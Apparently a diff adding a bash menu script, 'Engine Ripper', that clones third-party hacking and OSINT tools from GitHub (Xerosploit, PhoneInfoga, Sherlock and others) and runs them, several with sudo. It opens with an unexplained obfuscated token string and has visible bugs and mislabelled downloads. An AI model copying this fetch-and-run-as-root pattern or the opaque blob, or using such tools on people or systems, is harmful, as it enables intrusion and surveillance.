z$dEz$AFz$uyz$vyz$Tez$FJz$Ryz$PBz$z$yz$ABz$MDz$Iyz$CBz$wyz$dEz$AFz$xyz$jVz$TCz$yyz$AABz$DGz$ikz$z$yz$ABz$MDz$Iyz$CBz$BABz$dEz$AFz$CABz$DABz$EABz$TGz$LFz$z$yz$ABz$MDz$Iyz$CBz$FABz$dEz$AFz$GABz$mVz$nVz$oVz$pVz$ikz$z$yz$ABz$MDz$Iyz$CBz$HABz$dEz$AFz$IABz$bXz$cXz$dXz$eXz$fyz$WBz$z$yz$ABz$MDz$Iyz$CBz$JABz$dEz$AFz$KABz$Hcz$Icz$Jcz$DGz$ikz$z$yz$ABz$MDz$Iyz$CBz$LABz$dEz$AFz$MABz$ucz$vcz$dXz$eXz$fyz$WBz$z$yz$ABz$MDz$Iyz$CBz$NABz$dEz$AFz$OABz$Bez$Cez$FJz$Ryz$PBz$z$yz$ABz$MDz$Iyz$CBz$PABz$dEz$AFz$OABz$QABz$RABz$SABz$fyz$WBz$z$yz$ABz$MDz$Iyz$CBz$TABz$dEz$AFz$UABz$VABz$WABz$MBz$NBz$OBz$PBz$z$yz$ABz$MDz$Iyz$CBz$XABz$dEz$AFz$YABz$Fez$PBz$z$dBz$eBz$z$Gz$ZABz$aABz$z$HDz$z$CCz$DCz$ECz$bABz$cEz$z$uz$vz$z$yz$ABz$dEz$Dyz$PBz$z$yz$ABz$MCz$Eyz$TCz$MBz$NBz$Fyz$Gyz$Hyz$z$VCz$WCz$HJz$z$yz$ABz$MCz$dEz$AFz$PBz$z$yz$ABz$MDz$Iyz$CBz$cABz$dEz$AFz$dABz$Hgz$Igz$Jgz$Jcz$qGz$ikz$z$yz$ABz$MDz$Iyz$CBz$eABz$dEz$AFz$fABz$rgz$sgz$tgz$Taz$TGz$LFz$z$yz$ABz$MDz$Iyz$CBz$gABz$dEz$AFz$hABz$jjz$kjz$ljz$CLz$PGz$fyz$WBz$z$yz$ABz$MDz$Iyz$CBz$iABz$dEz$AFz$hABz$nkz$okz$pkz$qkz$rkz$TGz$jABz$Uez$z$yz$ABz$MDz$Iyz$CBz$kABz$dEz$AFz$lABz$Plz$Cez$FJz$Ryz$PBz$z$yz$ABz$MDz$Iyz$CBz$mABz$dEz$AFz$nABz$Qmz$Rmz$Smz$TGz$LFz$z$yz$ABz$MDz$Iyz$CBz$oABz$dEz$AFz$pABz$yrz$Asz$Bsz$Eez$Fez$PBz$z$yz$ABz$MDz$Iyz$CBz$qABz$dEz$AFz$IABz$rABz$sABz$tABz$uABz$Fdz$z$yz$ABz$MDz$Iyz$CBz$vABz$dEz$AFz$wABz$omz$pmz$psz$TTz$LFz$z$yz$ABz$MDz$Iyz$CBz$xABz$dEz$AFz$fABz$rgz$Ptz$Icz$mgz$PBz$z$yz$ABz$MDz$Iyz$CBz$yABz$dEz$AFz$OABz$Utz$Vtz$ABBz$PBz$z$yz$ABz$MDz$Iyz$CBz$BBBz$dEz$AFz$fABz$PWz$tuz$dXz$Tez$FJz$Ryz$PBz$z$yz$ABz$MDz$Iyz$CBz$CBBz$dEz$AFz$DBBz$qEz$EBBz$FBBz$GBBz$HBBz$Qwz$LFz$z$yz$ABz$MDz$Iyz$CBz$IBBz$dEz$AFz$JBBz$KBBz$LBBz$uXz$WBz$z$yz$ABz$MDz$Iyz$CBz$TABz$dEz$AFz$YABz$MBBz$NBBz$OBBz$PBBz$Iqz$WBz$z$yz$ABz$MDz$Iyz$CBz$XABz$dEz$AFz$YABz$MBBz$QBBz$RBBz$SBBz$WBz$z$dBz$eBz$z$Gz$ZABz$HJz$z$HDz$z$Gz$ZABz$TBBz$tz$z$Az$fBz$gBz$hBz$UJz$Nz$Oz$z$tIz$uIz$vIz$wIz$xIz$TGz$NKz$z$Sz$tBz$uBz$vBz$OKz$BCz$az$z$yYz$hnz$inz$hjz$qGz$bYz$z$Sz$tBz$uBz$vBz$GCz$BCz$az$z$Ymz$Zmz$amz$dXz$bmz$z$Sz$tBz$uBz$vBz$VPz$BCz$az$z$tjz$WXz$XXz$qGz$bYz$z$Sz$tBz$uBz$vBz$ePz$BCz$az$z$hhz$ihz$jhz$ghz$Qiz$z$Sz$tBz$uBz$vBz$xPz$BCz$az$z$Esz$Fsz$Gsz$dgz$egz$z$Sz$tBz$uBz$vBz$MQz$BCz$az$z$bgz$cgz$dgz$egz$z$Sz$tBz$uBz$vBz$URz$BCz$az$z$Nsz$Osz$lnz$DLz$ELz$ZOz$z$Sz$tBz$uBz$vBz$qRz$BCz$az$z$xKz$yKz$ALz$BLz$CLz$DLz$ELz$ZOz$z$Sz$tBz$uBz$vBz$ESz$uCz$vCz$wCz$z$vuz$wuz$DLz$ELz$ZOz$z$Sz$tBz$uBz$vBz$TSz$uCz$vCz$wCz$z$wvz$xvz$ELz$ZOz$z$Sz$tBz$uBz$vBz$jSz$uCz$vCz$wCz$z$yvz$Awz$xIz$TGz$NKz$z$Sz$tBz$uBz$vBz$uSz$uCz$vCz$wCz$z$Cwz$TGz$NKz$z$Sz$tBz$uBz$vBz$ITz$uCz$vCz$wCz$z$Gwz$Hwz$dgz$egz$z$Sz$tBz$uBz$vBz$QTz$uCz$vCz$wCz$z$gVz$hVz$iVz$jVz$kVz$ZOz$z$Sz$tBz$uBz$vBz$XTz$uCz$vCz$wCz$z$UXz$VXz$WXz$XXz$qGz$bYz$z$Sz$tBz$uBz$vBz$dTz$uCz$vCz$wCz$z$Ccz$Dcz$Ecz$Fcz$ELz$ZOz$z$Sz$tBz$uBz$vBz$uTz$uCz$vCz$wCz$z$wXz$scz$WXz$XXz$qGz$bYz$z$Sz$tBz$uBz$vBz$xTz$uCz$vCz$wCz$z$wdz$xdz$ydz$TGz$NKz$z$Sz$tBz$uBz$vBz$FUz$uCz$vCz$wCz$z$wdz$Iwz$fvz$qGz$bYz$z$Sz$tBz$uBz$vBz$UBBz$uCz$vCz$wCz$z$CCz$DCz$ECz$bABz$z$Sz$tBz$uBz$vBz$KCz$xBz$dBz$yBz$LCz$BCz$az$z$qz$rz$sBz$z$dz$z$CDz$DDz$EDz$FDz$GDz$z$qz$rz$sBz$z$hz$z$HDz$z$Gz$ZABz$VBBz$tz$z$Az$fBz$gBz$hBz$WBBz$AKz$BKz$z$Egz$Fgz$acz$ILz$Fcz$ELz$ZOz$z$Sz$tBz$uBz$vBz$uUz$uCz$vCz$wCz$z$iez$ogz$pgz$xFz$dgz$egz$z$Sz$tBz$uBz$vBz$DVz$uCz$vCz$wCz$z$djz$ejz$fjz$gjz$hjz$qGz$bYz$z$Sz$tBz$uBz$vBz$OVz$uCz$vCz$wCz$z$jkz$kkz$lkz$mkz$pVz$dgz$egz$z$Sz$tBz$uBz$vBz$XBBz$uCz$vCz$wCz$z$Nlz$xdz$ydz$TGz$NKz$z$Sz$tBz$uBz$vBz$YBBz$uCz$vCz$wCz$z$Mmz$Nmz$Omz$dgz$egz$z$Sz$tBz$uBz$vBz$ZBBz$uCz$vCz$wCz$z$trz$urz$vrz$wrz$Cez$NKz$z$Sz$tBz$uBz$vBz$aBBz$uCz$vCz$wCz$z$yZz$Usz$Vsz$Wsz$Xsz$ZOz$z$Sz$tBz$uBz$vBz$bBBz$uCz$vCz$wCz$z$CUz$ksz$lsz$msz$nsz$z$Sz$tBz$uBz$vBz$cBBz$uCz$vCz$wCz$z$iez$ogz$Dcz$CMz$NKz$z$Sz$tBz$uBz$vBz$dBBz$uCz$vCz$wCz$z$wdz$Ttz$HPz$NKz$z$Sz$tBz$uBz$vBz$eBBz$uCz$vCz$wCz$z$ruz$gVz$WXz$fmz$NKz$z$Sz$tBz$uBz$vBz$fBBz$uCz$vCz$wCz$z$Ytz$bYz$z$Sz$tBz$uBz$vBz$UBBz$uCz$vCz$wCz$z$CCz$DCz$ECz$FCz$z$Sz$tBz$uBz$vBz$KCz$xBz$dBz$yBz$LCz$BCz$az$z$qz$rz$sBz$z$dz$z$CDz$DDz$EDz$FDz$GDz$z$qz$rz$sBz$z$hz$z$HDz$z$WJz$gBBz$ZXz$z$uz$vz$z$yz$ABz$dEz$AFz$PBz$z$yz$ABz$hBBz$iBBz$iBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$mBBz$z$uz$vz$z$yz$ABz$nBBz$iBBz$iBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$iBBz$iBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$pBBz$iBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$qBBz$iBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$rBBz$iBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$iBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$pBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$qBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$rBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$sBBz$iBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$sBBz$pBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$sBBz$qBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$sBBz$rBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$sBBz$sBBz$jBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$yz$ABz$oBBz$sBBz$sBBz$sBBz$tBBz$kBBz$lBBz$AIz$z$VCz$WCz$aABz$z$uz$vz$z$HDz$z$WJz$uBBz$z$qz$rz$sBz"
+if [ "$PREFIX" = "/data/data/com.termux/files/usr" ]; then
+TERMUX=true
+elif [ "$(uname)" = "Darwin" ]; then
+MAC=true
+else
+LINUX=true
+fi
+trap 'printf "\n";stop;exit 1' 2
+main_menu() {
+clear
+banner
+printf "\n\e[1;92m"
+printf "[\e[1;96m01\e[1;92m] Show Tools Categories\n"
+printf "[\e[1;96m02\e[1;92m] Termux Search Tool\n"
+printf "[\e[1;96m03\e[1;92m] About\n"
+printf "[\e[1;96m00\e[1;92m] Exit\n"
+inputs
+if [[ $input == 2 || $input == 02 ]]; then
+php src/search.php
+main_menu
+elif [[ $input == 1 || $input == 01 ]]; then
+show_linux_list
+elif [[ $input == 3 || $input == 03 ]]; then
+about
+elif [[ $input == 0 || $input == 00 ]]; then
+printf "\n\nGood Bye & Thanks For Using ...\n"
+sleep 0.8
+printf "\nDon't forget to Join Telegram Group: http://t.me/linux_repo\n\n"
+sleep 0.5
+exit 1
+elif [[ $input == re || $input == RE ]]; then
+bash engrip.sh
+else
+command_not_found
+fi
+}
+banner() {
+printf "\n\e[1;92m"
+printf " _____             _               ____  _                         \e[1;92m\n"
+printf "| ____|_ __   __ _(_)_ __   ___   |  _ \(_)_ __  _ __   ___ _ __   \e[1;92m\n"
+printf "|  _| | '_ \ / _' | | '_ \ / _ \  | |_) | | '_ \| '_ \ / _ \ '__|  \e[1;91m\n"
+printf "| |___| | | | (_| | | | | |  __/  |  _ <| | |_) | |_) |  __/ |     \e[1;91m\n"
+printf "|_____|_| |_|\__, |_|_| |_|\___|  |_| \_\_| .__/| .__/ \___|_|     \e[1;92m\n"
+printf "             |___/                        | |   | |                \e[1;92m\n"
+printf "                  \e[1;96mCoded by \e[1;95m@AbirHasan2005\e[1;92m |_|   |_|\e[1;92m\n\n"
+}
+error_handle() {
+printf "\n\n\e[1;91mThere was an error!\n\e[1;92mPlease report to Telegram Group: \e[1;96mhttp://t.me/linux_repo\e[1;92m\n\n"
+}
+command_not_found() {
+printf "\n\e[1;92m[\e[1;91m!\e[1;92m]\e[1;91m Command Not Found!\n"
+sleep 1
+main_menu
+}
+inputs() {
+read -p $'\n\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[1;96m' input
+}
+about() {
+clear
+printf "\n\n\e[1;92m"
+printf "=========================================\n"
+printf "\e[1;95m                  About\e[1;92m\n"
+printf "=========================================\n"
+printf "\n"
+printf "\e[1;94m           Engine Ripper \n"
+printf "\e[1;92m           ------------------\n"
+printf "\n\e[0m"
+printf "This is a collection of best Linux & Termux Tools. We have\n"
+printf "currently 50+ tools and we are trying to get 1000+ tools in\n"
+printf "this Engine Ripper. If you want to suggest me any tool than\n"
+printf "Feel Free to share your tools on my Telegram Group.\n"
+printf "\n\e[0;93m"
+printf "Here most of tools are collected from GitHub. Thanks to the\n"
+printf "tools owners for there tools. If have any problem with any\n"
+printf "tool than tell us on my Telegram Group.\n\e[1;92m"
+printf "\n"
+printf "Coded by \e[1;96m@AbirHasan2005\e[1;92m\n"
+printf "Special Thanks to \e[1;93m@Palahsu\e[1;92m\n"
+printf "Also Thanks to the tools Members.\n"
+printf "\n"
+printf "Telegram Group: \e[1;95mhttp://t.me/linux_repo\e[1;92m\n"
+printf "GitHub: \e[1;95mhttps://github.com/AbirHasan2005\e[1;92m\n"
+printf "GitHub: \e[1;95mhttps://github.com/Palahsu\e[1;92m\n"
+printf "\n\n\e[1;92mPress ENTER to continue to Engine Ripper ..."
+read -p $'\e[1;96m ' enter_press
+clear
+banner
+main_menu
+}
+do_you_want_to_open_tool() {
+printf "\n\nDo you want to open tool & check?"
+read -p $'(y/n): \e[1;96m' input_open
+}
+anonymously_hiding_tools_L() {
+clear
+printf "\n\e[1;92mAnonymously Hiding Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Anonmously Surf \n"
+printf "[\e[1;93m2\e[1;92m] Multitor \n"
+printf "[\e[1;93m0\e[1;92m] Back\n"
+inputs
+if [[ $input == 1 ]]; then
+printf "\n\nDownloading kali-anonsurf from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/Und3rf10w/kali-anonsurf.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd kali-anonsurf
+chmod +x *
+./installer.sh
+anonsurf status
+printf "\n\n\e[1;92mPress ENTER to continue to Engine Ripper ..."
+read -p $'\e[1;96m ' enter_press
+cd ..
+anonymously_hiding_tools_L
+else
+anonymously_hiding_tools_L
+fi
+elif [[ $input == 2 ]]; then
+printf "\n\nDownloading kali-anonsurf from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/trimstray/multitor.git
+do_you_want_to_open_tool
+if [[ $input == y || $input == Y ]]; then
+cd multitor
+./setup.sh install
+multitor --help
+printf "\n\n\e[1;92mThis tool needs TOR, netcat, haproxy, polipo, privoxy & http-proxy-to-socks ...\n\e[1;92m"
+printf "\n\n\e[1;92mPress ENTER to continue to Engine Ripper ..."
+read -p $'\e[1;96m ' enter_press
+cd ..
+anonymously_hiding_tools_L
+else
+anonymously_hiding_tools_L
+fi
+elif [[ $input == 0 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+information_gathering_tools_L() {
+clear
+printf "\n\e[1;92mInformation Gathering Tools: \n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] LittleBrother \n"
+printf "[\e[1;93m2\e[1;92m] OPRecon (Combination of PhoneinFoga & IPGeoLocation) \n"
+printf "[\e[1;93m3\e[1;92m] Network Map (nmap) \n"
+printf "[\e[1;93m4\e[1;92m] UserRecon (Username recon tool) \n"
+printf "[\e[1;93m5\e[1;92m] Dracnmap \n"
+printf "[\e[1;93m6\e[1;92m] IPGeoLocation (IP Address info collector) \n"
+printf "[\e[1;93m7\e[1;92m] PhoneInFoga (Phone Number info collector) \n"
+printf "[\e[1;93m8\e[1;92m] Xerosploit \n"
+printf "[\e[1;93m9\e[1;92m] RED HAWK \n"
+printf "[\e[1;93m10\e[1;92m] ReconSpider \n"
+printf "[\e[1;93m11\e[1;92m] Sherlock \n"
+printf "[\e[1;93m12\e[1;92m] Infoga - Email OSINT \n"
+printf "[\e[1;93m13\e[1;92m] ReconDog \n"
+printf "[\e[1;93m14\e[1;92m] Striker \n"
+printf "[\e[1;93m15\e[1;92m] SecretFinder (Like: API) \n"
+printf "[\e[1;93m16\e[1;92m] Shodanfy (Find Info Using Shodan) \n"
+printf "[\e[1;93m17\e[1;92m] rang3r (Port Scanner) \n"
+printf "[\e[1;93m18\e[1;92m] Breacher \n"
+printf "[\e[1;93m19\e[1;92m] fsociety \n"
+printf "[\e[1;93m20\e[1;92m] Discover \n"
+printf "[\e[1;93m21\e[1;92m] Raccoon \n"
+printf "[\e[1;93m22\e[1;92m] sandmap \n"
+printf "[\e[1;93m23\e[1;92m] OSIF \n"
+printf "[\e[1;93m24\e[1;92m] CoronaStats\n"
+printf "[\e[1;93m00\e[1;92m] Back \n"
+inputs
+if [[ $input == 1 ]]; then
+printf "\n\nDownloading LittleBrother from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/LittleBrother.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd LittleBrother
+if [ "$TERMUX" = true ]; then
+pkg install python git wget -y
+pip3 install -r requirements.txt
+python3 littlebrother.py
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+pip3 install -r requirements.txt
+python3 littlebrother.py
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+error_handle
+cd ..
+press_enter
+information_gathering_tools_L
+fi
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+elif [[ $input == 2 ]]; then
+printf "\n\nDownloading OPRecon from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/OPRecon.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd OPRecon
+if [ "$TERMUX" = true ]; then
+pkg install git python wget -y
+pip3 install -r requirements.txt
+chomd +x run.sh update.sh
+bash run.sh
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip git -y
+pip3 install -r requirements.txt
+chomd +x run.sh update.sh
+bash run.sh
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+error_handle
+cd ..
+press_enter
+information_gathering_tools_L
+fi
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 3 ]]; then
+printf "\n\nDownloading & Installing nmap ...\n"
+sleep 1.8
+if [ "$TERMUX" = true ]; then
+pkg install nmap -y
+printf "\n\nSetup complete!\n"
+do_you_want_to_open_tool
+elif [ "$LINUX" = true ]; then
+sudo apt install nmap -y
+printf "\n\nSetup complete!\n"
+do_you_want_to_open_tool
+elif [ "$MAC" = true ]; then
+brew install nmap
+printf "\n\nSetup complete!\n"
+do_you_want_to_open_tool
+else
+printf "\n\n\e[1;91mThere was an error!\n\e[1;92mPlease report to Telegram Group: http://t.me/linux_repo\n\n"
+fi
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[0m"
+nmap --help
+sleep 2
+printf "\n\n\e[1;92mPress ENTER to continue to Engine Ripper ..."
+read -p $'\e[1;96m ' enter_press
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 4 ]]; then
+printf "\n\nDownloading UserRecon from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/UserRecon.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd UserRecon
+chomd +x *
+bash userrecon.sh
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 5 ]]; then
+printf "\n\nDownloading Dracnmap from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/Screetsec/Dracnmap.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\n\e[1;91mThis will need root permission ...\n\e[1;92m"
+sleep 2
+cd Dracnmap
+chmod +x Dracnmap.sh
+sudo ./Dracnmap.sh
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 6 ]]; then
+printf "\n\nDownloading IPGeoLocation from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/maldevel/IPGeoLocation
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd IPGeoLocation
+if [ "$TERMUX" = true ]; then
+pkg install python git wget -y
+pip3 install -r requirements.txt
+python3 ip2geolocation.py --help
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip git -y
+pip3 install -r requirements.txt
+python3 ip2geolocation.py --help
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+error_handle
+cd ..
+press_enter
+information_gathering_tools_L
+fi
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 7 ]]; then
+printf "\n\nDownloading PhoneInFoga from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/abhinavkavuri/PhoneInfoga.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\nEnter your phone number in international format ...\n"
+read -p $'\n\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[1;93m Enter Number: \e[1;92m' number
+printf "\n\e[1;92m This process will take a few moments ...\n\n\e[1;92m"
+sleep 2
+cd PhoneInfoga
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+mv config.example.py config.py
+python3 -m pip install -r requirments.txt
+chmod +x *
+python3 phoneinfoga.py -n $number
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+mv config.example.py config.py
+python3 -m pip install -r requirments.txt
+chmod +x *
+python3 phoneinfoga.py -n $number
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+error_handle
+press_enter
+cd ..
+information_gathering_tools_L
+fi
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 8 ]]; then
+printf "\n\nDownloading Xerosploit from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/LionSec/xerosploit.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\n\e[1;91mThis will need python2.7 & root permission ...\n\e[1;92m"
+sleep 2
+if [ "$TERMUX" = true ]; then
+pkg install python2 -y
+cd xerosploit
+sudo python2 install.py
+sudo xerosploit
+cd ..
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt-get install python2 -y
+cd xerosploit
+sudo python2 install.py
+sudo xerosploit
+cd ..
+information_gathering_tools_L
+else
+printf "\n\n\e[1;91mThere was an error!\n\e[1;92mPlease report to Telegram Group: http://t.me/linux_repo\n\n"
+fi
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 9 ]]; then
+printf "\n\nDownloading RED_HAWK from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/Tuhinshubhra/RED_HAWK.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd RED_HAWK
+php rhawk.php
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 10 ]]; then
+printf "\n\nDownloading ReconSpider from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/bhavsec/reconspider.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+if [ "$TERMUX" = true ]; then
+cd reconspider
+pkg install python3 -y
+sudo python3 setup.py install
+python3 reconspider.py
+cd ..
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+cd reconspider
+sudo apt install python3 python3-pip -y
+sudo python3 setup.py install
+python3 reconspider.py
+cd ..
+information_gathering_tools_L
+else
+error_handle
+fi
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 11 ]]; then
+printf "\n\nDownloading Sherlock from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/sherlock-project/sherlock.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+if [ "$TERMUX" = true ]; then
+cd sherlock
+pkg install python3 -y
+pip3 install -r requirements.txt
+python3 sherlock --help
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+cd sherlock
+sudo apt install python3 python3-pip -y
+python3 -m pip install -r requirements.txt
+python3 sherlock --help
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+error_handle
+fi
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 12 ]]; then
+printf "\n\nDownloading Infoga from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/m4ll0k/Infoga.git infoga
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd infoga
+if [ "$TERMUX" = true ]; then
+pkg install python2 -y
+python2 setup.py install
+python2 infoga.py
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python2 python2-pip -y
+python2 setup.py install
+python2 infoga.py
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+error_handle
+cd ..
+press_enter
+information_gathering_tools_L
+fi
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 13 ]]; then
+printf "\n\nDownloading ReconDog from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/s0md3v/ReconDog
+printf "\n\n\e[1;92mFile Saved to \e[1;94m"
+pwd
+printf "\n\e[1;92mPlease install setup manually!\n"
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+information_gathering_tools_L
+elif [[ $input == 14 ]]; then
+printf "\n\nDownloading Striker from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/s0md3v/Striker
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd Striker
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+pip3 install -r requirements.txt
+python3 striker.py -h
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+pip3 install -r requirements.txt
+python3 striker.py -h
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+error_handle
+cd ..
+press_enter
+information_gathering_tools_L
+fi
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 15 ]]; then
+printf "\n\nDownloading SecretFinder from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/m4ll0k/SecretFinder
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd SecretFinder
+python3 -m pip install -r requirements.txt
+python3 SecretFinder.py
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 16 ]]; then
+printf "\n\nDownloading SecretFinder from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/m4ll0k/Shodanfy.py Shodanfy
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd Shodanfy
+python3 shodanfy.py
